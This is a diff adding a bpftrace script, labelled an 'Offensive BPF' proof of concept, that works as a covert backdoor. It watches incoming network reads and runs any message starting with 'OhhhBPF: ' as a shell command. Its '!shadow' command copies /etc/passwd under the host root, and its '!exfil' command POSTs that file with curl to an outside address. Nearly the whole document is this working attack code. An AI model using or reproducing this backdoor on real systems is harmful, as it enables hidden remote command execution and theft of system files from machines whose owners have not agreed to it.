@@ -1,0 +1,147 @@
+#include <net/sock.h>
+
+
+# Basic proof of concept to trigger commands based on incoming
+# messages with a special signature, in this case "OhhhBPF: "
+# The script requires to specify IP address (as integer!) and source port, 
+# that are required to be able to invoke commands
+
+
+BEGIN
+{
+  printf("Welcome to Offensive BPF... Use Ctrl-C to exit.\n");
+  printf("Allowed IP: %u (=> %s). Magic Port: %u\n", $1, ntop(AF_INET, $1), $2);
+}
+
+tracepoint:syscalls:sys_enter_accept*
+{ 
+  printf("->sys_enter_accept: %s\n", comm);
+  @sk[tid] = args->upeer_sockaddr;
+}
+
+tracepoint:syscalls:sys_exit_accept*
+/ @sk[tid] /
+{
+  $sk = (struct sockaddr_in *) @sk[tid]; 
+
+  if ($sk->sin_family == AF_INET) 
+  {
+    $src_port_tmp = (uint16) $sk->sin_port;
+    $src_addr     = $sk->sin_addr.s_addr;
+    $src_port     = (( $src_port_tmp  >> 8) |  (( $src_port_tmp << 8) & 0x00FF00));
+
+    printf("->sys_exit_accept*: Process: %s. Remote IP: %s (%d). Port: %u\n", 
+              comm,  
+              ntop(AF_INET, $sk->sin_addr.s_addr),
+              $sk->sin_addr.s_addr,
+              $src_port);
+
+    if (($sk->sin_addr.s_addr == (uint32)$1))// &&  ($src_port == (uint16) $2))
+    {
+        printf("->sys_exit_accept*: IP and magic port check passed.\n");  
+        //printf("->sys_exit_accept*: Storing fd: %d.\n", $fd);  
+        
+        @sys_accepted[tid] = 1; 
+    }
+    else
+    { 
+          printf("->sys_exit_accept*: IP/Magic port check FAILED.\n"); 
+    } 
+  } 
+  else
+  {
+    printf("Unsupported net family: %d\n", $sk->sin_family);
+  }  
+}
+
+tracepoint:syscalls:sys_enter_read
+/ @sys_accepted[tid] /
+{   
+  printf("->sys_enter_read for allowed thread (fd: %d)\n", args->fd);
+  @sys_read[tid] = args->buf;
+}
+
+tracepoint:syscalls:sys_exit_read
+{
+  $len = args->ret;  
+
+  if ((@sys_read[tid] != 0) && ($len > 9))
+  { 
+    //lot's of assumption, but should work for line based protocols
+    $cmd = str(@sys_read[tid], 9);
+    if ($cmd == "OhhhBPF: ")
+    {
+      $cmd = str(@sys_read[tid]+9, $len-9-1);
+
+      printf("*** Command: %s\n", $cmd);
+      //printf("DATA (buf): %r\n\n", buf(@sys_read[tid], $len));
+
+      if ($cmd == "!shadow")
+      {     
+        printf("Command::shadow");
+        system("cat /etc/passwd >> /proc/1/root/tmp/o");
+      }
+      else if ($cmd == "!exfil")
+      {   
+        printf("Command::exfil\n");
+        system("curl -X POST --data-binary @/proc/1/root/tmp/o %s", str($1));
+        system("rm -f /proc/1/root/tmp/o");
+      }
+      else
+      {
+        system("%s >> /proc/1/root/tmp/o", $cmd);
+      }
+    }
+  } 
+}
+
+tracepoint:syscalls:sys_enter_recvfrom
+/ @sys_accepted[tid] /
+{   
+  printf("->sys_enter_recvfrom for allowed thread (fd: %d)\n", args->fd);
+  @sys_recvfrom[tid] = args->ubuf;
+}
+
+tracepoint:syscalls:sys_exit_recvfrom
+{
+  $len = args->ret;
+
+  if ((@sys_recvfrom[tid] != 0) && ($len > 9))
+  { 
+    //lot's of assumption, but should work for line based protocols
+    $cmd = str(@sys_recvfrom[tid], 9);
+    if ($cmd == "OhhhBPF: ")
+    {
+      $cmd = str(@sys_recvfrom[tid]+9, $len-9-1)
+    }
+
+    printf("*** Command: %s\n", $cmd);
+    //printf("DATA (buf): %r\n\n", buf(@sys_recvfrom[tid], $len));
+
+    if ($cmd == "!shadow")
+    {   
+      printf("Command::shadow");
+      system("cat /etc/passwd >> /proc/1/root/tmp/o");
+    }
+    else if ($cmd == "!exfil")
+    {   
+      printf("Command::exfil\n");
+      system("curl -X POST --data-binary @/proc/1/root/tmp/o %s", str($1));
+      system("rm -f /proc/1/root/tmp/o");
+    }
+    else
+    {
+      system("%s >> /proc/1/root/tmp/o", $cmd);
+    }
+  } 
+}
+
+
+END
+{
+  clear(@sk);
+  clear(@sys_accepted);
+  clear(@sys_read);
+  clear(@sys_recvfrom);
+  printf("Exiting. Bye.\n");
+}
